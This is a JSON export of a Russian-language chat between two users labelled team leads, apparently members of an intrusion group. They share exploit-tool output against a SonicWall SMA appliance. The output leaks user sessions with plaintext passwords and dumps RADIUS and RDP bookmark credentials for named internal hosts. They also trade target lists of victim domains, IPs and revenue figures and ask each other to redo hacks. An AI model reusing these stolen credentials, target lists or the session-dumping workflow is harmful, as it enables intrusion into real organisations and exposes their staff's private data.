@@ -1,0 +1,229 @@
+{
+  "messages": [
+    {
+      "_id": "3oQZ7PhQsooT4d8RE",
+      "rid": "Rmne8eAkiu37dhm5zyJcaRFnKQqepiffHq",
+      "msg": "а вторая?",
+      "ts": "2021-02-09T22:20:50.698Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2021-02-09T22:20:50.746Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "HojDeRdHmymGfKvQE",
+      "rid": "Rmne8eAkiu37dhm5zyJcaRFnKQqepiffHq",
+      "msg": "```\n[+] Looking for RADIUS domain creds\n[+] Found radius domains, parsing\n[!!] Found radius domain creds\n[+] aDfoj344*#l2eh2@192.168.188.64\n\n[+] Parsing bookmarks\n[+] Found bookmarks, Hunting for creds\n[+] Found bookmark, without creds (Uses the same creds as the sslvpn login for the creating user\n{'userGroupID': 24, 'name': 'PNGC-ACCTRDS-01 (Dual Monitors)', 'username': '', 'password': '', 'service': 'UNK_SERVICE', 'host': 'PNGC-ACCTRDS-01.pngc.com'}\n[+] Found bookmark, without creds (Uses the same creds as the sslvpn login for the creating user\n{'userGroupID': 24, 'name': 'PNGC-ACCTRDS-01 (Single Monitor)', 'username': '', 'password': '', 'service': 'UNK_SERVICE', 'host': 'PNGC-ACCTRDS-01.pngc.com'}\n[+] Found bookmark, without creds (Uses the same creds as the sslvpn login for the creating user\n{'userGroupID': 25, 'name': 'PNGC-RDS-01 (Dual Monitors)', 'username': '', 'password': '', 'service': 'UNK_SERVICE', 'host': 'PNGC-RDS-01.pngc.com'}\n[+] Found bookmark, without creds (Uses the same creds as the sslvpn login for the creating user\n{'userGroupID': 25, 'name': 'PNGC-RDS-01 (Single Monitor)', 'username': '', 'password': '', 'service': 'UNK_SERVICE', 'host': 'PNGC-RDS-01.pngc.com'}\n[**] Found bookmark with creds\n[+] Found bookmark {'name': 'PNGC-ACCTSQL-01 (Support)', 'username': 'dynamics.support', 'password': 'Oragne85Taco', 'service': 'RDP', 'host': '192.168.188.96'}\n[**] Found bookmark with creds\n[+] Found bookmark {'name': 'PNGC-ACCTRDS-01 (Support)', 'username': 'dynamics.support', 'password': 'Oragne85Taco', 'service': 'RDP', 'host': '192.168.188.97'}\n[**] Found bookmark with creds\n[+] Found bookmark {'name': 'PNGC-ACCTSQL-02 (Support)', 'username': 'dynamics.support', 'password': 'Oragne85Taco', 'service': 'RDP', 'host': '192.168.188.129'}\n[**] Found bookmark with creds\n[+] Found bookmark {'name': 'PNGC-ACCTRDS-02 (Support)', 'username': 'dynamics.support', 'password': 'Oragne85Taco', 'service': 'RDP', 'host': '192.168.188.128'}\n[+] Found bookmark, without creds (Uses the same creds as the sslvpn login for the creating user\n{'userGroupID': 44, 'name': 'PNGC-ACCTRDS-02 (Single Monitor)', 'username': '', 'password': '', 'service': 'UNK_SERVICE', 'host': 'PNGC-ACCTRDS-02.pngc.com'}\n[+] Found bookmark, without creds (Uses the same creds as the sslvpn login for the creating user\n{'userGroupID': 44, 'name': 'PNGC-ACCTRDS-02 (Dual Monitors)', 'username': '', 'password': '', 'service': 'UNK_SERVICE', 'host': 'PNGC-ACCTRDS-02.pngc.com'}\n```",
+      "ts": "2021-02-09T15:56:51.808Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2021-02-09T15:56:52.036Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "E8vd2nG27FN8QZ763",
+      "rid": "Rmne8eAkiu37dhm5zyJcaRFnKQqepiffHq",
+      "msg": "```\n[+] Checking URL https://205.236.0.43\n[+] Found old SMA version (<9.x)\n[+] Appliance running version 9.0.0.9-26sv\n\n[+] Leaking sessions to dump configuration.\n[+] Attempting to dump sessions from https://205.236.0.43\n      [+] Found: SessionID: 1Ao1qakSkqZUQ1Yg1r1V8Z0n7l7axQdQUQAH4HgrtHQ= userType: 1 userName: abarter Password: warrenwitches Domain: pngcdomain\n      [+] Found: SessionID: O1DgDOf7kN2aFj18o7YPpz4hRCEUQj16ekh8Z18qBFE= userType: 1 userName: ajackson Password: tessakitty0625 Domain: pngcdomain\n      [+] Found: SessionID: UkvbkafqdnyTOwAHibeL3GQY4Uy31VVdg8h0jqldA1g= userType: 1 userName: mdonovan Password: FUH@ck3rs! Domain: pngcdomain\n      [+] Found: SessionID: b1CAsgAi6GwDG5Ab6yC9Z0Xj9cbl5axwogMpNoWpu24= userType: 1 userName: tstubblefield Password: LordofLords2 Domain: pngcdomain\n[+] Done with https://205.236.0.43, found 4 sessions\n```",
+      "ts": "2021-02-09T15:56:09.268Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2021-02-09T15:56:09.435Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "DeYrNEkzPWzSSDPTk",
+      "rid": "Rmne8eAkiu37dhm5zyJcaRFnKQqepiffHq",
+      "msg": "тогда эти?",
+      "ts": "2021-02-09T15:43:01.625Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2021-02-09T15:43:01.668Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "2FFAEeoCawzidiuYZ",
+      "rid": "Rmne8eAkiu37dhm5zyJcaRFnKQqepiffHq",
+      "msg": "```\nleeandmason.com\tL&M Domain\t107.0.14.250\ttl\t127kk\tSTOPPED\t2fa need hot sessions\n\n```",
+      "ts": "2021-02-09T15:42:50.548Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2021-02-09T15:42:50.636Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Q8Asn3FggxZRo62XF",
+      "rid": "Rmne8eAkiu37dhm5zyJcaRFnKQqepiffHq",
+      "msg": "```\npngc.com\tpngcdomain\t205.236.0.43\tuser4\t238kk\tSTOPPED\tno valid accounts\n\n```",
+      "ts": "2021-02-09T15:42:35.525Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2021-02-09T15:42:35.609Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "mty4d7wrTRmSKTZRk",
+      "rid": "Rmne8eAkiu37dhm5zyJcaRFnKQqepiffHq",
+      "msg": "первая вообще это город какой-то что ли",
+      "ts": "2021-02-09T15:41:47.388Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2021-02-09T15:41:47.421Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "qQhmrNBhvEQrFubkS",
+      "rid": "Rmne8eAkiu37dhm5zyJcaRFnKQqepiffHq",
+      "msg": "а почему именно их?",
+      "ts": "2021-02-09T15:41:36.069Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2021-02-09T15:41:36.103Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "kcjdu4LPDfyuzNrwQ",
+      "rid": "Rmne8eAkiu37dhm5zyJcaRFnKQqepiffHq",
+      "msg": "можно у этих переснять пожалуйста",
+      "ts": "2021-02-09T15:40:38.333Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2021-02-09T15:40:38.372Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "TyZE9AYkbHmwjntRY",
+      "rid": "Rmne8eAkiu37dhm5zyJcaRFnKQqepiffHq",
+      "msg": "```\nmadison.il.us\tgisnet1\t71.14.246.203\nredwoodcity.org\tredwoodcity.org\t76.14.0.148\ncanalbarge.com\tcanalbarge\t50.233.57.77\n\n```",
+      "ts": "2021-02-09T15:40:29.522Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2021-02-09T15:40:29.618Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Thp2zHjmYnJ4Ez7bQ",
+      "rid": "Rmne8eAkiu37dhm5zyJcaRFnKQqepiffHq",
+      "msg": "+",
+      "ts": "2021-02-09T15:31:05.473Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2021-02-09T15:31:05.506Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "tm2JtdZhWWFN8fPHY",
+      "rid": "Rmne8eAkiu37dhm5zyJcaRFnKQqepiffHq",
+      "msg": "есть, я тут еще часа полтора точно",
+      "ts": "2021-02-09T15:29:47.850Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2021-02-09T15:29:47.881Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ceQFqnYrPvKTn2LeE",
+      "rid": "Rmne8eAkiu37dhm5zyJcaRFnKQqepiffHq",
+      "msg": "чтобы я соображать начал)",
+      "ts": "2021-02-09T15:26:48.199Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2021-02-09T15:26:48.238Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ZJ2DJmXJmLT7xZjFP",
+      "rid": "Rmne8eAkiu37dhm5zyJcaRFnKQqepiffHq",
+      "msg": "у меня мин 30 есть?",
+      "ts": "2021-02-09T15:26:43.458Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2021-02-09T15:26:43.491Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "gtjDpw9pQm8LPnXRr",
+      "rid": "Rmne8eAkiu37dhm5zyJcaRFnKQqepiffHq",
+      "msg": "понял",
+      "ts": "2021-02-09T15:26:39.639Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2021-02-09T15:26:39.682Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Yyxce9HpJZpvEtinG",
+      "rid": "Rmne8eAkiu37dhm5zyJcaRFnKQqepiffHq",
+      "msg": "можно переснять 2фа где-то если надо",
+      "ts": "2021-02-09T15:25:23.325Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2021-02-09T15:25:23.365Z",
+      "mentions": [],
+      "channels": []
+    }
+  ],
+  "success": true
+}
